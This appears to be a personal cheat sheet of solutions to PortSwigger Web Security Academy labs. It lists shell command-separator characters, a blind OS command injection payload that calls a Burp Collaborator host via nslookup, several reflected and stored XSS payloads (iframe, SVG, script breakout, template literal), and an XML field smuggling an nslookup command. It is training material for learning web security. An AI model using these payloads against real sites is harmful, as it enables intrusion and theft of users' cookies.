

## Checklist

```
;    # Command separator
&&   # AND operator
|    # Pipe
||   # OR operator
`    # Backticks (command substitution)
$( ) # Command substitution
>    # File overwrite (redirection)
<    # Read from file
&    # Background execution
#    # Comment to cut off rest of line

```

### Lab: Blind OS command injection with out-of-band interaction
``` http

||nslookup+iugscdkgi0wod89q46pagcu5uw0nohc6.oastify.com+||
```
### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
``` HTML

<            iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"          ></iframe>


```


### Lab: Reflected XSS with some SVG markup allowed

``` http 

https://0a4a00490415d2b981b1c55e002900bc.h1-web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E
```


### Lab: Reflected XSS in canonical link tag

``` Http
`?%27accesskey=%27x%27onclick=%27alert(1)`

```


### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped


``` javascript

</script><img src=1 onerror=alert(document.domain)>

```

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

```javascript


/?search=\';alert(1)// 
```


### Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped


``` javascript

/?search=aaaa${alert(document.domain)}
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>

```




### In an XML like

```
<address>

00000 ; nslookup https://collab;
</address>
```